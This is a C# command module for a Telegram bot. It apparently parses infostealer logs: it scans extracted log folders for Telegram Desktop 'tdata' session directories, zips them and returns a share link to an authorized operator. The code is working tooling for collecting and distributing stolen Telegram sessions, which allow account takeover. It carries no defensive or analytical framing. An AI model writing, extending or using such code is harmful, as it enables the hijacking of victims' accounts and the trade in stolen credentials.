using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class TelegramServiceCommand(Client client, DataService data) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    Task ICommand.Invoke(UpdateNewMessage update, User user) =>
        client.SendMessageAvailableLogs(user, "Telegram", data);
    
    async Task ICallbackCommand.Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (await client.SendCallbackAvailableLogsOrGetPath(user, data, update.msg_id, update.data) is not
            { } logsname) return;

        await client.EditMessage(user, update.msg_id, $"Telegram\nParsing from {logsname}");

        var directories = Directory.GetDirectories(data.GetExtractedPath(logsname))
                                        .SelectMany(x => Directory.GetDirectories(x, "*", SearchOption.AllDirectories))
                                        .Select(x => new DirectoryInfo(x))
                                        .Where(x => x.Name.StartsWith("Telegram") || x.Name.StartsWith("tdata"))
                                        .SelectMany(x => x.Name.StartsWith("Telegram") ? x.GetDirectories() : [x])
                                        .Select(x => x.FullName)
                                        .ToArray();

        var archive = Path.Combine(data.BaseFolder, "Telegram", $"{logsname}.zip");
        using var zip = new Ionic.Zip.ZipFile(archive);

        for (int i = 0; i < directories.Length; i++)
        {
            zip.AddDirectory(directories[i], $"{i}");
        }

        zip.Save();

        await client.EditMessage(user, update.msg_id, $"{logsname}\n{await data.GetShareLinkAsync(archive)}");
    }
}